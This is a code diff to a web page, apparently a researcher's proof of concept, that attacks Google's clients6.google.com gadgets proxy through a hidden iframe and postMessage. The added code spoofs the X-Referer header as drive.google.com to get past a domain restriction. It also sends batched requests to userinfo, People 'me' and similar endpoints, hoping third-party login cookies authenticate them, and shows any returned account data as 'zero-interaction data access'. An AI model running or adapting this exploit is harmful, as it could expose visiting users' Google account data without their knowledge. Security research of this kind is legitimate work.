@@ -59,7 +59,8 @@ Both should return the same value. Paste YOUR value below (don't use the placeho
 <button onclick="runPublicTest()">Discovery + Certs (NO auth)</button>
 <button onclick="runApiKeyTest()">Drive/Books/YT with API key ONLY (no user auth)</button>
 <button onclick="runContentProxy()">content.googleapis.com proxy (Gmail test)</button>
-<button onclick="runRefererInjectTest()">Referer injection → X-Referer bypass</button>
+<button onclick="runRefererInjectTest()">Referer inject (r: field, fixed)</button>
+<button onclick="runUserinfoTest()">userinfo + login-cookie APIs (NO SAPISIDHASH)</button>
 
 <p class="warn" style="font-size:0.9em">
 <b>SAPISID3PHASH 3P-only</b>: origin=majdch22.github.io (X-Origin set by proxy)<br>
@@ -472,14 +473,17 @@ async function runRefererInjectTest() {
     if (!msg) return;
     if (msg.s && msg.s.startsWith('ready:') && !refSent) {
       refSent = true;
-      log('ok', 'Ready. Sending makeHttpRequests with referer:"https://drive.google.com" injected...');
-      // KEY: add referer field to the gadgets.rpc message → $h() sets X-Referer: https://drive.google.com
+      log('ok', 'Ready. Sending makeHttpRequests with r:"https://drive.google.com" injected...');
+      // KEY: gadgets.rpc uses field 'r' (not 'referer') for X-Referer injection.
+      // Confirmed from proxy source: this.referer = J.r (line ~53425)
+      // $h() then does: _.ph(e, "X-Referer", d) where d=this.referer=J.r
+      // So r:"https://drive.google.com" → X-Referer: https://drive.google.com → passes *.google.com restriction
       proxyIframe.contentWindow.postMessage(JSON.stringify({
         s: 'makeHttpRequests', f: '..', c: 'ref-1', a: [requests], t: rpcToken,
         l: null, g: true,
-        referer: 'https://drive.google.com'  // ← INJECTED: sets X-Referer on proxy XHR
+        r: 'https://drive.google.com'  // ← CORRECT FIELD: 'r' sets X-Referer via $h()
       }), 'https://clients6.google.com');
-      log('ok', 'Message sent with referer:"https://drive.google.com" field');
+      log('ok', 'Message sent with r:"https://drive.google.com" — expect different error (not "referer blocked")');
     }
     if (msg.s !== '__cb') return;
     log('ok', '__cb received');
@@ -500,7 +504,85 @@ async function runRefererInjectTest() {
     });
     window.removeEventListener('message', refHandler);
   });
-  setTimeout(function() { if (!refSent) { refSent = true; log('warn', '5s fallback'); proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'ref-1', a: [requests], t: rpcToken, l: null, g: true, referer: 'https://drive.google.com' }), 'https://clients6.google.com'); } }, 5000);
+  setTimeout(function() { if (!refSent) { refSent = true; log('warn', '5s fallback'); proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'ref-1', a: [requests], t: rpcToken, l: null, g: true, r: 'https://drive.google.com' }), 'https://clients6.google.com'); } }, 5000);
+}
+
+// userinfo + login-cookie APIs test
+// Tests endpoints that may authenticate via login cookies (__Secure-3PSID, __Secure-3PSIDCC)
+// sent automatically in the same-origin XHR from clients6.google.com.
+// No SAPISIDHASH needed — if any of these return 200, we have zero-interaction data access.
+// Key insight: proxy XHR is same-origin → all SameSite=None cookies from google.com are sent.
+// SID, HSID are SameSite=Lax (NOT sent), but __Secure-3PSID etc. may be SameSite=None.
+async function runUserinfoTest() {
+  logEl.innerHTML = '';
+  document.getElementById('results').innerHTML = '';
+  const rpcToken = 'usr' + Math.random().toString(36).substr(2, 10);
+  const pageOrigin = location.origin;
+  log('ok', 'userinfo + login-cookie test (NO SAPISIDHASH, relies on 3P cookies in proxy XHR)');
+  log('warn', '200 = proxy 3P cookies authenticate endpoint → zero-interaction data access!');
+  log('warn', '401 MISSING = no credential found (3P cookies don\'t count for this endpoint)');
+  log('warn', '401 INVALID = credential found but rejected');
+
+  if (proxyIframe) proxyIframe.remove();
+  proxyIframe = document.createElement('iframe');
+  proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+  proxyIframe.src = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+    '#parent=' + encodeURIComponent(pageOrigin) + '&rpctoken=' + rpcToken + '&origin=' + encodeURIComponent(pageOrigin);
+  document.body.appendChild(proxyIframe);
+
+  const requests = [
+    // OAuth2 userinfo — accepts Bearer token OR login cookies per error message
+    { key: 'userinfo-v2', params: { url: '/oauth2/v2/userinfo', httpMethod: 'GET', headers: {}, body: null } },
+    // Alternative path
+    { key: 'userinfo-v2-me', params: { url: '/userinfo/v2/me', httpMethod: 'GET', headers: {}, body: null } },
+    // People API me
+    { key: 'people-me', params: { url: '/v1/people/me?personFields=names,emailAddresses', httpMethod: 'GET', headers: {}, body: null } },
+    // Plus API me (deprecated but may still respond)
+    { key: 'plus-me', params: { url: '/plus/v1/people/me', httpMethod: 'GET', headers: {}, body: null } },
+    // Tokeninfo with no token — expect 400, but reveals routing
+    { key: 'tokeninfo', params: { url: '/oauth2/v3/tokeninfo', httpMethod: 'GET', headers: {}, body: null } },
+    // Google Workspace userinfo via admin
+    { key: 'openid-userinfo', params: { url: '/openid/v2/userinfo', httpMethod: 'GET', headers: {}, body: null } },
+    // Public webfonts — no auth, no key
+    { key: 'webfonts', params: { url: '/webfonts/v1/webfonts?fields=items(family)', httpMethod: 'GET', headers: {}, body: null } },
+    // Version history — public, no auth
+    { key: 'versionhistory', params: { url: '/versionhistory/v1/chrome/platforms', httpMethod: 'GET', headers: {}, body: null } }
+  ];
+
+  let usrSent = false;
+  window.addEventListener('message', function usrHandler(e) {
+    if (e.source !== proxyIframe.contentWindow) return;
+    let msg; try { msg = JSON.parse(e.data); } catch(e) { return; }
+    if (!msg) return;
+    if (msg.s && msg.s.startsWith('ready:') && !usrSent) {
+      usrSent = true;
+      log('ok', 'Ready. Sending userinfo + public API batch...');
+      proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'usr-1', a: [requests], t: rpcToken, l: null, g: true }), 'https://clients6.google.com');
+    }
+    if (msg.s !== '__cb') return;
+    log('ok', '__cb received');
+    let responseMap; try { responseMap = JSON.parse(msg.a[1]); } catch(e) { log('warn', 'parse fail'); return; }
+    Object.entries(responseMap).forEach(([key, wrapper]) => {
+      const status = wrapper.data && wrapper.data.status;
+      const bodyStr = wrapper.data && wrapper.data.body;
+      const cls = status === 200 ? 'crit' : (status === 401 ? 'warn' : 'warn');
+      log(cls, key + ' → HTTP ' + status);
+      if (status === 200) {
+        let data; try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
+        const div = document.getElementById('results');
+        const block = document.createElement('div');
+        block.style = 'border:2px solid #ff4444;margin:8px 0;padding:10px;';
+        block.innerHTML = '<pre class="crit">🎯 ' + key + ' HTTP 200 (NO SAPISIDHASH! 3P cookies auth!):\n' + JSON.stringify(data, null, 2).substring(0, 3000) + '</pre>';
+        div.appendChild(block);
+        log('crit', '🎯 ZERO-INTERACTION DATA ACCESS: ' + key + ' → ' + JSON.stringify(data).substring(0, 200));
+      } else {
+        const errMsg = (() => { try { return JSON.parse(bodyStr).error?.message; } catch(e) { return String(bodyStr).substring(0, 120); } })();
+        log('warn', '  ' + key + ': ' + errMsg);
+      }
+    });
+    window.removeEventListener('message', usrHandler);
+  });
+  setTimeout(function() { if (!usrSent) { usrSent = true; proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'usr-1', a: [requests], t: rpcToken, l: null, g: true }), 'https://clients6.google.com'); } }, 5000);
 }
 
 // Public endpoint test — no auth required at all
